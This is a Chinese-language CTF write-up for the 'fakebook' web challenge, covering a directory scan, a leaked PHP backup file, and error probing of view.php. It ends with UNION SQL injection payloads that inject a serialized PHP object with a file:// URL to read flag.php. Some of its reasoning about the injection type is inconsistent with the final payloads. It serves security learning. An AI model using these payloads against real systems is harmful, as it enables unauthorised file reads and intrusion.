# fakebook WP

拿到题目打开之后发现是一个类似于博客的应用

有两个功能：

- login

  需要用户，密码

- join

  需要有效blog

我首先是扫描了一下目录：

```
feroxbuster -u http://61.147.171.35:59720/ 
```

发现有一个文件：

```
/user.php.bak
```

下载之后是一个php文件：

发现当中的有效信息就是：

```
public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
```

这个函数说明了，什么是有效的blog

可接受的格式：

- http://example.com
- https://sub.examople.co:8080/path
- example.com/path

不可接收的格式：

- 不带点的字符串
- 含空格或特殊字符的URL

所以要想绕过blog，那么提交一个正确的格式就行。

因为可接收的格式较多，那么我们也就可以推测，这个blog很有可能就是我们之后可以实施攻击的地方。



##### 验证：

通过 blog=http://127.0.0.1.com成功创建了一个账号

那么我们可以多创建几个试试



我创建了两个用户。

burp抓包用户列表的页面

在response的源码中看到一个可疑的：

```
<a href='view.php?no=2'>
```

我们可以试着访问：

```
/view.php?no=1
```

发现返回的是创建的第一个用户的详情页。

我们可以紧接着测试一下边界点：

```
/view.php?no=99
```

接下来就会报错：

```

username	age	blog

Notice: Trying to get property of non-object in /var/www/html/view.php on line 53

Notice: Trying to get property of non-object in /var/www/html/view.php on line 56





the contents of his/her blog


Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67
```

也就是说明：

> 当 no 参数不存在对应记录时，程序仍尝试将查询结果作为 UserInfo 对象使用，并调用其方法，导致报错。
>  由此可推测 view.php 中 no 参数直接参与 SQL 查询，且返回结果未经校验即被 unserialize 并使用，存在 SQL 注入风险。

因为在PHP中常见的情况是：

```
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_assoc($result); // 如果没查到 → false
```

所以：

```
$user = unserialize($row['userinfo']); // row 是 false
```

程序没有判断是否成功，

而是直接用：

```
$user->name
$user->age
$user->blog
$user->getBlogContents()
```



既然已经猜测是SQL注入，那么我们输入单引号试一试：

#### 尝试 `'`:

```
*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1)


Fatal error: Call to a member function fetch_assoc() on boolean in /var/www/html/db.php on line 66
```

那么也就是这就是一个**SQL注入！**



#### 尝试 `'/**/union/**/select/**/1,2,3,4--`

报错：

```
[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''/**/UNION/**/SELECT/**/1,2,3,4--' at line 1)
```



在对 `no` 参数进行 UNION 注入测试时，数据库返回的报错信息显示 SQL 语句在单引号附近发生语法错误，表明该参数被置于字符串上下文中。由此可确定这是一个字符串型 SQL 注入点，后续利用需正确处理引号闭合与原始语句注释问题。













view.php?no=-1/**/UNION/**/SELECT/**/1,2,3,'O:8:"Fakebook":3:{s:8:"username";s:4:"test";s:3:"age";i:18;s:4:"blog";s:4:"test";}'



no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'





记得查看源码